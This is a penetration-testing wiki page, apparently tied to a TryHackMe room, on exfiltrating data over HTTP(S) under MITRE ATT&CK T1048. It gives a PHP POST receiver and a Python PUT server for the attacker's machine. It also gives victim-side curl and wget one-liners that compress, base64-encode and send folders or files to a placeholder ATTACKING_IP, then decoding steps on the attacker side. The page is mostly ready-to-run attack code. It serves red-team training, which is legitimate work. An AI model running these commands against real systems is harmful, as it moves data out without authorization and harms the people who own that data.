---
description: MITRE ATT&CK™  - Exfiltration Over Alternative Protocol - Technique T1048
---

# Over HTTP(s)

## Theory

Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux curl may be used to invoke protocols such as HTTP/S

{% hint style="danger" %}
We can also use [HTTP(S) Tunneling](../pivoting/http-tunneling.md) as a good [exfiltration](./) channel.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Linux - POST" %}
We will host a simple PHP server in order to retrieve encoded POST data.

First write the following code in your `index.php` file

```php
<?php
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
}
?>
```

Second, start the PHP web-server in the same directory

```bash
# Start server on port 80
v4resk㉿kali$ php -S 0.0.0.0:80
```

On the victim computer, you can now send data through POST request. It will be saved at `/tmp/http.bs64`

```bash
# Linux
# Compress folder, base64, and send
user@victime$ curl --data "file=$(tar zcf - folderToExfiltrate | base64)" http://ATTACKING_IP/
```

On attacking machine, we can decode now decode it:

```bash
# Decode compressed folders
v4resk㉿kali$ sed -i 's/ /+/g' /tmp/http.bs64
v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
```
{% endtab %}

{% tab title="Linux - PUT" %}
Using the following code, we will host a simple python server in order to retrieve PUT data.&#x20;

{% code title="http-put-server.py" %}
```python
#!/usr/bin/env python
import os
try:
    import http.server as server
except ImportError:
    # Handle Python 2.x
    import SimpleHTTPServer as server

class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)

        # Don't overwrite files
        if os.path.exists(filename):
            self.send_response(409, 'Conflict')
            self.end_headers()
            reply_body = '"%s" already exists\n' % filename
            self.wfile.write(reply_body.encode('utf-8'))
            return

        file_length = int(self.headers['Content-Length'])
        with open(filename, 'wb') as output_file:
            output_file.write(self.rfile.read(file_length))
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))

if __name__ == '__main__':
    server.test(HandlerClass=HTTPRequestHandler)
```
{% endcode %}

On attacking host, start the server.

```bash
v4resk㉿kali$ python http-put-server.py
```

Then we can exfiltrate data from the victime host using `curl` or `wget`.

```bash
user@victime$ curl -X PUT --upload-file somefile.txt http://<ATTACKING_IP>:8000
user@victime$ wget -O- --method=PUT --body-file=somefile.txt http://<ATTACKING_IP>:8000/somefile.txt
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/dataxexfilt" %}
